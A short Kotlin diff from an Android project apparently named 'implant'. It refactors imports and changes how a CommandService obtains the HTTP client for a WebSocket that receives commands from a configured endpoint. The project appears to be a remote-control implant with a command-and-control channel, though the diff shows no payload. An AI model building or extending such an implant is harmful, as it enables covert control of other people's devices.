@@ -3,11 +3,12 @@ package com.cooperthecoder.implant.command
 import android.app.Service
 import android.content.Context
 import android.content.Intent
-import android.os.*
+import android.os.IBinder
 import android.util.Log
+import com.cooperthecoder.implant.App
 import com.cooperthecoder.implant.Config
-import com.cooperthecoder.implant.Networking
-import okhttp3.*
+import okhttp3.Request
+import okhttp3.WebSocket
 
 class CommandService : Service() {
 
@@ -45,7 +46,7 @@ class CommandService : Service() {
                 .url(Config.WEBSOCKETS_ENDPOINT)
                 .build()
         val commandListener = CommandListener(this)
-        webSocket = Networking.httpClient(this).newWebSocket(request, commandListener)
+        webSocket = (application as App).httpClient.newWebSocket(request, commandListener)
     }
 
 
